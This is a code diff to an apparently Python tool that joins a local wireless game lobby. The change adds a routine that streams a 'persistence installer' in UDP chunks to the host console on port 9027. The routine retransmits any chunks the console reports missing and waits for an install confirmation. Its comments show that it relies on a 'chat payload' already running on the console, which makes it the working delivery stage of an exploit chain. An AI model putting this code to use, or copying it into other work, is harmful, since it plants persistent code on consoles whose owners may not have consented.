@@ -17,6 +17,10 @@ from connection import PLAYER_NAME
 DEFAULT_CHAT_DELAY_MS = 10
 DEFAULT_HANDSHAKE_SCALE = 1.0
 MIN_DURATION = 30
+INSTALLER_PORT = 9027
+INSTALLER_CHUNK_SIZE = 1100
+INSTALLER_REPAIR_ROUNDS = 60
+INSTALLER_TIMEOUT = 180
 logger = logging.getLogger(__name__)
 
 
@@ -34,7 +38,105 @@ async def run(args, network):
     with trio.socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, args.ifname.encode() + b"\0")
         await sock.bind((local_ip, protocol.PORT))
-        return await session.run(sock)
+        result = await session.run(sock)
+
+    if result != 0 or args.installer_template is None:
+        return result
+
+    template_b64 = args.installer_template.read_bytes()
+    apply_b64 = args.installer_apply.read_bytes()
+    return await send_installer_over_ldn(args.ifname, local_ip, host_ip, template_b64, apply_b64)
+
+
+async def send_installer_over_ldn(ifname, local_ip, host_ip, template_b64, apply_b64):
+    """Stream the installer on LDN UDP :9027 and repair chunks the console missed."""
+    template_chunks = [template_b64[i:i + INSTALLER_CHUNK_SIZE]
+                       for i in range(0, len(template_b64), INSTALLER_CHUNK_SIZE)]
+    apply_chunks = [apply_b64[i:i + INSTALLER_CHUNK_SIZE]
+                    for i in range(0, len(apply_b64), INSTALLER_CHUNK_SIZE)]
+    if not template_chunks or not apply_chunks:
+        raise RuntimeError("Installer assets are empty.")
+
+    def chunk_packet(kind, index):
+        data = template_chunks[index] if kind == "T" else apply_chunks[index]
+        return kind.encode("ascii") + str(index).encode("ascii") + b":" + data
+
+    target = (host_ip, INSTALLER_PORT)
+    header = f"A{len(template_chunks)}:{len(apply_chunks)}:{local_ip}".encode("ascii")
+    with trio.socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, ifname.encode() + b"\0")
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 512 * 1024)
+        await sock.bind((local_ip, INSTALLER_PORT))
+
+        print(
+            f"Sending persistence installer over LDN UDP :{INSTALLER_PORT} "
+            f"({len(template_chunks)} template + {len(apply_chunks)} script chunks)...",
+            flush=True,
+        )
+        for _ in range(3):
+            await sock.sendto(header, target)
+            await trio.sleep(0.1)
+
+        # Give the chat payload time to finish binding its UDP receiver.
+        await trio.sleep(0.5)
+        for kind, chunks in (("J", apply_chunks), ("T", template_chunks)):
+            for index in range(len(chunks)):
+                await sock.sendto(chunk_packet(kind, index), target)
+                await trio.sleep(0.001)
+
+        print("Installer chunks sent; checking for missing data...", flush=True)
+        transfer_complete = False
+        install_status = None
+        rounds = 0
+        deadline = time.monotonic() + INSTALLER_TIMEOUT
+
+        while install_status is None and time.monotonic() < deadline:
+            if not transfer_complete:
+                if rounds >= INSTALLER_REPAIR_ROUNDS:
+                    break
+                await sock.sendto(b"G", target)
+                rounds += 1
+                receive_window = 0.15
+            else:
+                receive_window = 1.0
+
+            window_end = min(deadline, time.monotonic() + receive_window)
+            while install_status is None and time.monotonic() < window_end:
+                remaining = window_end - time.monotonic()
+                packet = None
+                sender = None
+                with trio.move_on_after(remaining):
+                    packet, sender = await sock.recvfrom(2048)
+                if packet is None or sender[0] != host_ip:
+                    continue
+
+                if packet == b"D":
+                    if not transfer_complete:
+                        print("Console received all installer chunks; installing...", flush=True)
+                    transfer_complete = True
+                elif packet == b"I:OK":
+                    install_status = "ok"
+                elif packet == b"I:ERR":
+                    install_status = "error"
+                elif packet[:1] in (b"t", b"j"):
+                    try:
+                        kind = "T" if packet[:1] == b"t" else "J"
+                        index = int(packet[1:])
+                        chunks = template_chunks if kind == "T" else apply_chunks
+                        if 0 <= index < len(chunks):
+                            await sock.sendto(chunk_packet(kind, index), target)
+                            await trio.sleep(0.002)
+                    except ValueError:
+                        logger.debug("Ignoring malformed installer NAK: %r", packet)
+
+        if install_status == "ok":
+            print("Persistence installed over LDN (INSTALL DONE).", flush=True)
+            return 0
+        if install_status == "error":
+            raise RuntimeError("The console reported that the persistence installer failed.")
+        if not transfer_complete:
+            raise RuntimeError("Timed out repairing installer chunks over LDN.")
+        raise RuntimeError("Timed out waiting for INSTALL DONE from the console.")
 
 
 class LobbySession:
